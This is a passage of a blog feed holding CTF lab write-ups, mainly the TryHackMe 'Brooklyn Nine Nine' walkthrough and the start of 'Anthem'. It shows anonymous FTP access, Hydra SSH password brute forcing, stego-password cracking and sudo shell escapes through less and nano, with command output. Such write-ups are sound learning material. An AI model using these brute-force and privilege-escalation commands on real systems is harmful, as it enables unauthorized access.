  27   │ 80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
  28   │ |_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  29   │ |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
  30   │ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  31   │ 
  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  33   │ # Nmap done at Mon Oct  5 20:19:07 2020 -- 1 IP address (1 host up) scanned in 12.41 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ftp-enumeration&quot;&gt;FTP-Enumeration&lt;/h3&gt;

&lt;p&gt;It Looks Anonymous login is available on the FTP-Server. So this is my first way to check the FTP-Server.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.93.39 
Connected to 10.10.93.39.
220 (vsFTPd 3.0.3)
Name (10.10.93.39:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp&amp;gt; get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (332.9826 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;On the FTP-Server there is a file witch i downloaded. 
After downloading the File, we can check was is in it.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat note_to_j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note_to_jake.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ From A&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;,
   2   │ 
   3   │ J&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; please change your password. It is too weak and h&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; will be mad &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;someone hacks into the nine nine
   4   │ 
   5   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As in the note mentioned, J*** has a week password. So we can try it to Brue-Froce the password with Hydra.&lt;/p&gt;

&lt;h3 id=&quot;hydra-bruteforce&quot;&gt;Hydra-BruteForce&lt;/h3&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 16 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt 10.10.93.39 ssh                                    
Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2020-10-05 21:04:41
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~896525 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.10.93.39:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 10.10.93.39   login: jake   password: 9&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;1
1 of 1 target successfully completed, 1 valid password found
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Writing restore file because 3 final worker threads did not &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;until &lt;/span&gt;end.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR] 3 targets did not resolve or could not be connected
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR] 0 target did not &lt;span class=&quot;nb&quot;&gt;complete
&lt;/span&gt;Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2020-10-05 21:05
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few seconds we got a password for J***&lt;/p&gt;

&lt;p&gt;Password: 9&lt;strong&gt;**&lt;/strong&gt;*1&lt;/p&gt;

&lt;h3 id=&quot;ssh-login&quot;&gt;ssh login&lt;/h3&gt;

&lt;p&gt;Now we have the Username and the Password. We can now login into the Target with this credentials.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;@10.10.93.39
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After login, on this user, there is no User-flag located. So i tried to check other user directorys. But i don’t have any permission to do that.&lt;/p&gt;

&lt;p&gt;So i decided to go for root and check then the other directorys.&lt;/p&gt;

&lt;p&gt;First i checked the sudo -l command. And yes we can run a command with sudo rights.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;@brookly_nine_nine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;jake on brookly_nine_nine:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User jake may run the following commands on brookly_nine_nine:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/l&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;priv-escalation&quot;&gt;Priv-Escalation&lt;/h3&gt;

&lt;p&gt;Now lets have a look at GTFO-Bins. If we can escalate the privilage with that application. 
GTFOBins:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; /etc/profile
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now i have root privilage and we can check for the flags.&lt;/p&gt;

&lt;p&gt;proof that iam root.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@brookly_nine_nine:~# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now first check for the user-flag, found three user on the target:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@brookly_nine_nine:/home# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;a&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;  h&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;  j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;sh

So i decided to look into the folder &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the user flag. Found user flag &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;User H&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;

&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;sh
root@brookly_nine_nine:/home/&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
nano.save  user.txt
root@brookly_nine_nine:/home/&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# cat user.txt&lt;/span&gt;
ee11cbb19052e40b07aac0ca060c23ee
e&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have found the user flag lets get the root flag:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@brookly_nine_nine:/root# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;root.txt
root@brookly_nine_nine:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Creator : Fsociety2006 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Congratulations &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;rooting Brooklyn Nine Nine


Enjoy!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No we got the root flag.&lt;/p&gt;

&lt;h2 id=&quot;second-way&quot;&gt;Second Way&lt;/h2&gt;

&lt;p&gt;For the second way i was checking the Webserver. If i found some interessting stuff on it.&lt;/p&gt;

&lt;p&gt;The Webpage is only a Picture of “Brooklyn-Nine-Nine”. so i decided to have a look into the Source-Code.&lt;/p&gt;

&lt;p&gt;Found a note under the picture.&lt;/p&gt;

&lt;h3 id=&quot;web-server-enumeration&quot;&gt;Web-Server Enumeration&lt;/h3&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;p&amp;gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;when scrolled to top&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, and that it scales nicely on all screen sizes.&amp;lt;/p&amp;gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Have you ever heard of steganography? &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I download the picture and check with stegehide if there is some hidden information stored.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;steghide extract &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; brooklyn99.jpg
Enter passphrase:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the extraction of the file i need a password. So i decided to go for a brute force attack on the password.&lt;/p&gt;

&lt;p&gt;After a little research i found a github project whitch is for brute-forcing a stegehide hidden note.&lt;/p&gt;

&lt;h3 id=&quot;brute-forceing-the-picture&quot;&gt;Brute-Forceing the Picture&lt;/h3&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s&lt;span class=&quot;k&quot;&gt;*********&lt;/span&gt; brooklyn99.jpg /usr/share/wordlists/rockyou.txt
S&lt;span class=&quot;k&quot;&gt;*********&lt;/span&gt; 2.0.9 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/Paradoxis/S&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 - Luke Paris &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Paradoxis&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Counting lines &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;wordlist..
Attacking file &lt;span class=&quot;s1&quot;&gt;'brooklyn99.jpg'&lt;/span&gt; with wordlist &lt;span class=&quot;s1&quot;&gt;'/usr/share/wordlists/rockyou.txt'&lt;/span&gt;..
Successfully cracked file with password: admin
Tried 20459 passwords
Your file has been written to: brooklyn99.jpg.out
admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The tool itself extract the file automatically.&lt;/p&gt;

&lt;p&gt;But i tried the password with stegehide.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;steghide extract &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to &lt;span class=&quot;s2&quot;&gt;&quot;note.txt&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A note.txt file is extracted from the picture. Lets see what is in that file.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat note.txt           
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ H&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; Password:
   2   │ f&lt;span class=&quot;k&quot;&gt;******************&lt;/span&gt;e
   3   │ 
   4   │ Enjoy!!
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have a Username and a password, so lets login in the the user.&lt;/p&gt;

&lt;h3 id=&quot;ssh-login-1&quot;&gt;ssh login&lt;/h3&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh h&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;@10.10.93.39               
h&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;@10.10.93.39&lt;span class=&quot;s1&quot;&gt;'s password: 
Last login: Mon Oct  5 18:45:59 2020 from 10.11.3.139
h***@brookly_nine_nine:~$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get access to the target. cat the user-flag witch is located under the logged in user.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;holt@brookly_nine_nine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
e&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets get the root flag.&lt;/p&gt;

&lt;p&gt;tried the commadn sudo-l and the user can run one command as sudo user:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;h&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;t@brookly_nine_nine:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;holt on brookly_nine_nine:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User holt may run the following commands on brookly_nine_nine:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/n&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;lets jump to GTFO-Bins to look if we can use nano for our priv-escalation&lt;/p&gt;

&lt;h3 id=&quot;priv-escalation-1&quot;&gt;Priv-Escalation&lt;/h3&gt;

&lt;p&gt;Found a way on GTFO-Bins for my Priv-Escalation.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;bin/n&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
^R^X
reset&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So I execudet the application and run the commands witch GFTO-Bins recommend.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Command to execute: reset&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0# &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have root access on the target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now read the root-flag under /root.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Creator : Fsociety2006 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Congratulations &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;rooting Brooklyn Nine Nine
Here is the flag: 6&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;5
Enjoy!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;The Box was easy and there was no new stuff in it. It was pretty forward. But i was nice and i had to check my learning on this box.&lt;/p&gt;
</description>
        <pubDate>Tue, 06 Oct 2020 00:00:00 +0000</pubDate>
        <link>/blog/brooklynNineNine/</link>
        <guid isPermaLink="true">/blog/brooklynNineNine/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Anthem</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Anthem&lt;/td&gt;
      &lt;td&gt;03.10.2020&lt;/td&gt;
      &lt;td&gt;easy&lt;/td&gt;
      &lt;td&gt;Windows, CMS, enumeration, Weekly Challange&lt;/td&gt;
      &lt;td&gt;–&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial $ip -Pn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rdesktop&lt;/td&gt;
      &lt;td&gt;rdesktop -u s* -p U&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;***! -d anthem.com $ip&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;open-ports&quot;&gt;open ports&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;Http-Server&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;msrpc&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;netbios-ssn&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;microsoft-ds?&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;389&lt;/td&gt;
      &lt;td&gt;ms-wbt-server&lt;/td&gt;
      &lt;td&gt;Microsoft Terminal Services&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;This Room is about a Web-Server where we have to find different flags, usernames and possible Passwords on the Web-Server.&lt;/p&gt;

&lt;p&gt;It is a Windows-Machine where i don’t have much experience for Priv-Escalation.&lt;/p&gt;

&lt;p&gt;So lets start with the Web-Analysis.&lt;/p&gt;

&lt;h1 id=&quot;website-analysis&quot;&gt;Website Analysis&lt;/h1&gt;

&lt;p&gt;I started with an nmap scan to find the open Ports:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/initial 10.10.151.141 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-10-02 21:15 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.151.141
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.079s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2020-10-02T19:15:38+00:00
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WIN-LU09299160F
| Not valid before: 2020-10-01T19:14:59
|_Not valid after:  2021-04-02T19:14:59
